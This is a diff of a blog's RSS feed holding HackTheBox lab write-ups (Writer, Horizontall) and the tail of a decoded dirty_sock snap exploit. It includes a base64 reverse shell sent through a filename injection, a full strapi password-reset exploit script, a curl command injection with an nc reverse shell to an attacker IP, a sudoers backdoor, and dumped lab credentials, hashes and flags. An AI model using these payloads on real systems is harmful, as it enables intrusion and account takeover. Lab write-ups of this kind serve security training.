 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
-&lt;p&gt;dirty_sock exploit base64 decoded:
-hsqs!V\�������������&amp;gt;x#!/bin/bash&lt;/p&gt;
-&lt;p&gt;useradd dirty_sock -m -p &amp;lsquo;$6$sWZcW1t25pfUdBuX$jWjEZQF2zFSfyGy9LbvG3vFzzHRjXfBYK0SOGfMD1sLyaS97AwnJUs7gDCY.fg19Ns3JwRdDhOcEmDpBVlF9m.&amp;rsquo; -s /bin/bash
+&lt;p&gt;dirty_sock exploit base64 decoded:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;hsqs!V\�������������&amp;gt;x#!/bin/bash
+
+useradd dirty_sock -m -p &#39;$6$sWZcW1t25pfUdBuX$jWjEZQF2zFSfyGy9LbvG3vFzzHRjXfBYK0SOGfMD1sLyaS97AwnJUs7gDCY.fg19Ns3JwRdDhOcEmDpBVlF9m.&#39; -s /bin/bash
 usermod -aG sudo dirty_sock
-echo &amp;ldquo;dirty_sock    ALL=(ALL:ALL) ALL&amp;rdquo; &amp;raquo; /etc/sudoers
+echo &amp;quot;dirty_sock    ALL=(ALL:ALL) ALL&amp;quot; &amp;gt;&amp;gt; /etc/sudoers
 name: dirty-sock
-version: &amp;lsquo;0.1&amp;rsquo;
+version: &#39;0.1&#39;
 summary: Empty snap, used for exploit
-description: &amp;lsquo;See &lt;a href=&#34;https://github.com/initstring/dirty_sock&#34;&gt;https://github.com/initstring/dirty_sock&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;&#39;
-architectures:&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;amd64
+description: &#39;See https://github.com/initstring/dirty_sock
+
+  &#39;
+architectures:
+- amd64
 confinement: devmode
 grade: devel
-��7zXZi&amp;quot;�6�d�!:)ȉ��]��Z���ꮚ�E��9&amp;gt;�Y���`dQ�R����d詯qj|��٩n��^5��I]u�#�Jq�A�uK9��Uy������YZ��7zXZi&amp;quot;�6�S�!�����K]j;n��Q�b3ʶ]I-�,����Hʭ�E��k�	$l5K�(�y���	_ͼӡ�h�D��u
-�&#39;�yE�YZ8��&amp;lt;\���&amp;gt;��base64: invalid input&lt;/li&gt;
+��7zXZi&amp;quot;�6�d�!:)ȉ��\]��Z���ꮚ�E��9&amp;gt;�Y���`dQ�R����d詯qj|��٩n��^5��I]u�#�Jq�A�uK9��Uy������YZ��7zXZi&amp;quot;�6�S�!�����K]j;n��Q�b3ʶ]I-�,����Hʭ�E��k�	$l5K�(�y���	_ͼӡ�h�D��u
+                                                                                  �&#39;�yE�YZ8��&amp;lt;\���&amp;gt;��base64: invalid input
+&lt;/code&gt;&lt;/pre&gt;</content>
+    </item>
+    
+    <item>
+      <title>Writer - HackTheBox machine</title>
+      <link>/labs/writer/</link>
+      <pubDate>Tue, 07 Sep 2021 13:18:30 +0200</pubDate>
+      
+      <guid>/labs/writer/</guid>
+      <description>&lt;ul&gt;
+&lt;li&gt;Rank: medium&lt;/li&gt;
+&lt;/ul&gt;</description>
+      <content>&lt;ul&gt;
+&lt;li&gt;Rank: medium&lt;/li&gt;
 &lt;/ul&gt;
+&lt;div class=&#34;hugo-encryptor-container&#34;&gt;
+  &lt;div class=&#34;hugo-encryptor-prompt&#34;&gt;
+    
+      &lt;p&gt;Part of this article is encrypted with password:&lt;/p&gt;
+    
+  &lt;/div&gt;
+  &lt;div class=&#34;hugo-encryptor-form&#34;&gt;
+    &lt;input
+      class=&#34;hugo-encryptor-input&#34;
+      placeholder=&#39;Please input the password&#39;
+    /&gt;
+    &lt;input
+      class=&#34;hugo-encryptor-button&#34;
+      type=&#34;button&#34;
+      value=&#39;Click to verify&#39;
+      onclick=&#34;_click_handler(this)&#34;
+    /&gt;
+  &lt;/div&gt;
+  &lt;div
+    class=&#34;hugo-encryptor-cipher-text&#34;
+    data-password=&#34;210339aaef5e0225ff2fc6e0677ee7cc&#34;
+    style=&#34;display: none;&#34;
+  &gt;
+    &lt;span style=&#34;display: none;&#34;&gt;--- DON&#39;T MODIFY THIS LINE ---&lt;/span&gt;
+    &lt;h2 id=&#34;foothold&#34;&gt;Foothold&lt;/h2&gt;
+&lt;p&gt;1- Nmap found 80 (http), 139, 445 (SMB), 22 (ssh)&lt;/p&gt;
+&lt;p&gt;2- Web discovery potential exploits:
+1- Uses php, contact page validate.js accesses contact.php but it returns 404???
+2- Subdomain fuzzing? wfuzz -c -u &amp;ldquo;&lt;a href=&#34;http://writer.htb/%22&#34;&gt;http://writer.htb/&amp;quot;&lt;/a&gt; -H &amp;ldquo;Host:FUZZ.writer.htb&amp;rdquo; -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt &amp;ndash;hl=318 -&amp;gt; None
+3- Path fuzzing: wfuzz -c -w /opt/SecLists/Discovery/Web-Content/raft-large-files.txt -u &lt;a href=&#34;http://writer.htb/FUZZ&#34;&gt;http://writer.htb/FUZZ&lt;/a&gt;
+&amp;gt; dashboard, administrative&lt;/p&gt;
+&lt;p&gt;3- SMB scanning?&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;enum4linux -a writer.htb &amp;gt; smb_enum.txt
+&lt;a href=&#34;https://book.hacktricks.xyz/pentesting/pentesting-smb&#34;&gt;https://book.hacktricks.xyz/pentesting/pentesting-smb&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;Intel:
+1- Usernames: john, kyle (Kyle Travis)
+2- Domains: WRITER, Builtin
+3- WRITER/kyle&lt;/p&gt;
+&lt;p&gt;With blank username and password CANNOT access IPC or writer2_projects shares.&lt;/p&gt;
+&lt;p&gt;4- Dashboard from Burpsuite is not interesting. See administrative &amp;ndash;&amp;gt; login form.&lt;/p&gt;
+&lt;p&gt;5- Try weak credentials. No luck. Try SQLi uname=admin;&amp;ndash;+ to access dashboard and edit stories.
+Try sqlmap -&amp;gt; None.&lt;/p&gt;
+&lt;p&gt;6- Image filename execution (command injection). ????
+touch &amp;lsquo;1.jpg; &lt;code&gt;echo L2Jpbi9iYXNoIC1jICIvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNDQvOTAwMSAwPiYxIg==| base64 -d | bash&lt;/code&gt;;&amp;rsquo;
+Attach file 1.jpg. Catch Burpsuite packet and in &amp;ldquo;image-url&amp;rdquo; add:
+file:///var/www/writer.htb/writer/static/img/1.jpg; &lt;code&gt;echo L2Jpbi9iYXNoIC1jICIvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNDQvOTAwMSAwPiYxIg==| base64 -d | bash&lt;/code&gt;;#&lt;/p&gt;
+&lt;p&gt;nc -lvnp 9001&lt;/p&gt;
+&lt;p&gt;7- cat /etc/mysql/mariadb.cnf:
+[client]
+database = dev
+user = djangouser &amp;lt;&amp;ndash;
+password = DjangoSuperPassword &amp;lt;&amp;ndash;
+default-character-set = utf8&lt;/p&gt;
+&lt;p&gt;8- Download the Flask source code &lt;strong&gt;init&lt;/strong&gt;.py.
+DB credentials for DB writer:
+admin &amp;lt;&amp;ndash;
+ToughPasswordToCrack &amp;lt;&amp;ndash;&lt;/p&gt;
+&lt;p&gt;9- Crack kyle hash:
+mysql -u admin -D writer -h 127.0.0.1 -p &amp;ndash;&amp;gt; nothing interesting
+mysql -u djangouser -D dev -h 127.0.0.1 -p
+kyle:pbkdf2_sha256$260000$wJO3ztk0fOlcbssnS1wJPD$bbTyCB8dYWMGYlz4dSArozTY7wcZCS7DV6l5dpuXM4A=&lt;/p&gt;
+&lt;p&gt;hashcat -a 0 -m 10000 hash.txt /usr/share/wordlists/rockyou.txt&lt;/p&gt;
+&lt;p&gt;kyle:marcoantonio&lt;/p&gt;
+&lt;p&gt;user.txt: 332b462c2b9d80d732ae0356922ec7c6&lt;/p&gt;
+&lt;h2 id=&#34;privilege-escalation&#34;&gt;Privilege escalation&lt;/h2&gt;
+&lt;p&gt;10- Modify /etc/postfix/disclaimer exploit. ????
+There is a postfix user. Why the user who runs the disclaimer script is john?&lt;/p&gt;
+&lt;p&gt;11- Apt privesc ???? See HackingArticles.
+/etc/apt/apt.conf.d/ is writable by management group (john).&lt;/p&gt;
+&lt;p&gt;Place exp (file) in /etc/apt/apt.conf.d/ and wait.
+nc -nlvp 1234&lt;/p&gt;
+&lt;p&gt;root.txt: 210339aaef5e0225ff2fc6e0677ee7cc&lt;/p&gt;
+
+  &lt;/div&gt;
+&lt;/div&gt;</content>
+    </item>
+    
+    <item>
+      <title>Horizontall - HackTheBox machine</title>
+      <link>/labs/horizontall/</link>
+      <pubDate>Tue, 07 Sep 2021 13:18:01 +0200</pubDate>
+      
+      <guid>/labs/horizontall/</guid>
+      <description>Rank: easy  Part of this article is encrypted with password:
+  --- DON&#39;T MODIFY THIS LINE --- Foothold 1- Nmap discovered 80 and 22.
+2- The webpage index.html doesn&amp;rsquo;t seem to be interactive. Enumerate web server with Nikto and inspect the JS files.
+nikto -h horizontall.htb Vue.js v2.6.12 vue-router v3.5.1 portal-vue 2.1.7 (Although I doubt front end is any juicy to attack&amp;hellip;)
+nginx/1.14.0 (Ubuntu) 3- nginx 1.14.0 has vulnerabilities that allow RCE: CVE-2021-23017&amp;gt; https://www.</description>
+      <content>&lt;ul&gt;
+&lt;li&gt;Rank: easy&lt;/li&gt;
+&lt;/ul&gt;
+
+
+
+
+&lt;div class=&#34;hugo-encryptor-container&#34;&gt;
+  &lt;div class=&#34;hugo-encryptor-prompt&#34;&gt;
+    
+      &lt;p&gt;Part of this article is encrypted with password:&lt;/p&gt;
+    
+  &lt;/div&gt;
+  &lt;div class=&#34;hugo-encryptor-form&#34;&gt;
+    &lt;input
+      class=&#34;hugo-encryptor-input&#34;
+      placeholder=&#39;Please input the password&#39;
+    /&gt;
+    &lt;input
+      class=&#34;hugo-encryptor-button&#34;
+      type=&#34;button&#34;
+      value=&#39;Click to verify&#39;
+      onclick=&#34;_click_handler(this)&#34;
+    /&gt;
+  &lt;/div&gt;
+  &lt;div
+    class=&#34;hugo-encryptor-cipher-text&#34;
+    data-password=&#34;095ff8dc5f20b8e1aef209106c989d0c&#34;
+    style=&#34;display: none;&#34;
+  &gt;
+    &lt;span style=&#34;display: none;&#34;&gt;--- DON&#39;T MODIFY THIS LINE ---&lt;/span&gt;
+    &lt;h2 id=&#34;foothold&#34;&gt;Foothold&lt;/h2&gt;
+&lt;p&gt;1- Nmap discovered 80 and 22.&lt;/p&gt;
+&lt;p&gt;2- The webpage index.html doesn&amp;rsquo;t seem to be interactive. Enumerate web server with Nikto and inspect the JS files.&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;nikto -h horizontall.htb
+&lt;/code&gt;&lt;/pre&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Vue.js v2.6.12
+vue-router v3.5.1
+portal-vue 2.1.7
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;(Although I doubt front end is any juicy to attack&amp;hellip;)&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;nginx/1.14.0 (Ubuntu)
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;3- nginx 1.14.0 has vulnerabilities that allow RCE:
+CVE-2021-23017&amp;gt; &lt;a href=&#34;https://www.cybersecurity-help.cz/exploits/53543/?ref=bulletin&#34;&gt;https://www.cybersecurity-help.cz/exploits/53543/?ref=bulletin&lt;/a&gt; &amp;ndash;&amp;gt; but requires that the victim nginx is capable of resolving dns names (the dns resolver feature is not on by default)&lt;/p&gt;
+&lt;p&gt;4- Fuzz the websit for virtual hosts.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;wfuzz -u &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;http://horizontall.htb/FUZZ&amp;#39;&lt;/span&gt; -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt --hc&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;404&lt;/span&gt;
+ffuf -c -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u http://horizontall.htb -H &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Host: FUZZ.horizontall.htb&amp;#34;&lt;/span&gt; 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Found: api-prod.horizontall.htb&lt;/p&gt;
+&lt;p&gt;Fuzz paths.&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;ffuf -c -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://api-prod.horizontall.htb/FUZZ
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Found: /reviews, /users, /admin -&amp;gt; /admin/auth/login&lt;/p&gt;
+&lt;p&gt;/reviews &amp;ndash;&amp;gt; json of reviews &amp;ndash;&amp;gt; username enumeration: john, doe, wails
+/admin/auth/login &amp;ndash;&amp;gt; check valid email with forgot password request, &lt;a href=&#34;mailto:admin@horizontall.htb&#34;&gt;admin@horizontall.htb&lt;/a&gt; is valid
+/users &amp;ndash;&amp;gt; 403&lt;/p&gt;
+&lt;p&gt;5- Google strapi.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;curl http://api-prod.horizontall.htb/admin/strapiversion
+&lt;span style=&#34;color:#75715e&#34;&gt;# {&amp;#34;strapiVersion&amp;#34;:&amp;#34;3.0.0-beta.17.4&amp;#34;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;There is an authentication bypass bug at CVE-2019-18818. strapi before 3.0.0-beta.17.5 mishandles password resets within packages/strapi-admin/controllers/Auth.js and packages/strapi-plugin-users-permissions/controllers/Auth.js.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;python3 strapi-exploit.py admin@horizontall.htb http://api-prod.horizontall.htb &lt;span style=&#34;color:#ae81ff&#34;&gt;1234567890&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Where strapi-exploit.py is:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; requests
+&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; sys
+&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; json
+ 
+args&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;argv
+ 
+&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; len(args) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;:
+    print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Usage: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; &amp;lt;admin_email&amp;gt; &amp;lt;url&amp;gt; &amp;lt;new_password&amp;gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;format(args[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]))
+    exit(&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)
+ 
+email &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; args[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]
+url &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; args[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;]
+new_password &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;  args[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;]
+ 
+s &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; requests&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;Session()
+ 
+version &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; json&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;loads(s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;/admin/strapiVersion&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;format(url))&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;text)
+ 
+print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[*] Detected version(GET /admin/strapiVersion): &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;format(version[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;strapiVersion&amp;#34;&lt;/span&gt;]))
+ 
+&lt;span style=&#34;color:#75715e&#34;&gt;#Request password reset&lt;/span&gt;
+print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[*] Sending password reset request...&amp;#34;&lt;/span&gt;)
+reset_request&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;{&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;email&amp;#34;&lt;/span&gt;:email, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;url&amp;#34;&lt;/span&gt;:&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;/admin/plugins/users-permissions/auth/reset-password&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;format(url)}
+s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;post(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;/&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;format(url), json&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;reset_request)
+ 
+&lt;span style=&#34;color:#75715e&#34;&gt;#Reset password to&lt;/span&gt;
+print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[*] Setting new password...&amp;#34;&lt;/span&gt;)
+exploit&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;{&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;code&amp;#34;&lt;/span&gt;:{}, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;password&amp;#34;&lt;/span&gt;:new_password, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;passwordConfirmation&amp;#34;&lt;/span&gt;:new_password}
+r&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;post(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;/admin/auth/reset-password&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;format(url), json&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;exploit)
+ 
+print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[*] Response:&amp;#34;&lt;/span&gt;)
+print(str(r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;content))
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;6- Now that I have admin dashboard access, let&amp;rsquo;s see if I can get RCE. I can upload files and I can install plugins (remember the Moodle one?). Do command injection in &lt;code&gt;plugin&lt;/code&gt; parameter and listen for the reverse shell.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;curl -i -s -k -X &lt;span style=&#34;color:#e6db74&#34;&gt;$&amp;#39;POST&amp;#39;&lt;/span&gt; -H &lt;span style=&#34;color:#e6db74&#34;&gt;$&amp;#39;Host: api-prod.horizontall.htb&amp;#39;&lt;/span&gt; -H &lt;span style=&#34;color:#e6db74&#34;&gt;$&amp;#39;Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjMwMzU1NDc0LCJleHAiOjE2MzI5NDc0NzR9.rBvt5WdIGjI1Bqy6gwTOG2S5bwLERaaeZPYWOXPoL7A&amp;#39;&lt;/span&gt; -H &lt;span style=&#34;color:#e6db74&#34;&gt;$&amp;#39;Content-Type: application/json&amp;#39;&lt;/span&gt; -H &lt;span style=&#34;color:#e6db74&#34;&gt;$&amp;#39;Origin: http://localhost:1337&amp;#39;&lt;/span&gt; -H &lt;span style=&#34;color:#e6db74&#34;&gt;$&amp;#39;Connection: close&amp;#39;&lt;/span&gt; --data &lt;span style=&#34;color:#e6db74&#34;&gt;$&amp;#39;{\&amp;#34;plugin\&amp;#34;:\&amp;#34;documentation &amp;amp;&amp;amp; $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.10.14.75 4444 &amp;gt;/tmp/f)\&amp;#34;,\&amp;#34;port\&amp;#34;:\&amp;#34;1337\&amp;#34;}&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;$&amp;#39;http://api-prod.horizontall.htb/admin/plugins/install&amp;#39;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Using the shell, we can get the /etc/passwd and in /opt/strapi/myapi/config/environments we can find database.json with MySQL credentials.&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
+syslog:x:102:106::/home/syslog:/usr/sbin/nologin
+messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
+_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
+lxd:x:105:65534::/var/lib/lxd/:/bin/false
+uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
+dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:109:1::/var/cache/pollinate:/bin/false
+sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
+developer:x:1000:1000:hackthebox:/home/developer:/bin/bash
+mysql:x:111:113:MySQL Server,,,:/nonexistent:/bin/false
+strapi:x:1001:1001::/opt/strapi:/bin/sh
+&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-json&#34; data-lang=&#34;json&#34;&gt;{
+  &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;defaultConnection&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;default&amp;#34;&lt;/span&gt;,
+  &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;connections&amp;#34;&lt;/span&gt;: {
+    &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;default&amp;#34;&lt;/span&gt;: {
+      &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;connector&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;strapi-hook-bookshelf&amp;#34;&lt;/span&gt;,
+      &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;settings&amp;#34;&lt;/span&gt;: {
+        &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;client&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;mysql&amp;#34;&lt;/span&gt;,
+        &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;database&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;strapi&amp;#34;&lt;/span&gt;,
+        &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;host&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;127.0.0.1&amp;#34;&lt;/span&gt;,
+        &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;port&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;3306&lt;/span&gt;,
+        &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;username&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;developer&amp;#34;&lt;/span&gt;,
+        &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;password&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;#J!:F9Zt2u&amp;#34;&lt;/span&gt;
+      },
+      &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;options&amp;#34;&lt;/span&gt;: {}
+    }
+  }
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;privilege-escalation&#34;&gt;Privilege escalation&lt;/h2&gt;
+&lt;p&gt;7- Tried reusing mysql creds for developer but it was unsuccessful. Maybe can get the creds from mysql database. Nope.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;mysql -u developer -p &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;#J!:F9Zt2u&amp;#39;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;8- View listening ports.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;netstat -nato 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;There is a Laravel page: Laravel v8 (PHP v7.4.18) at http://localhost:8000.
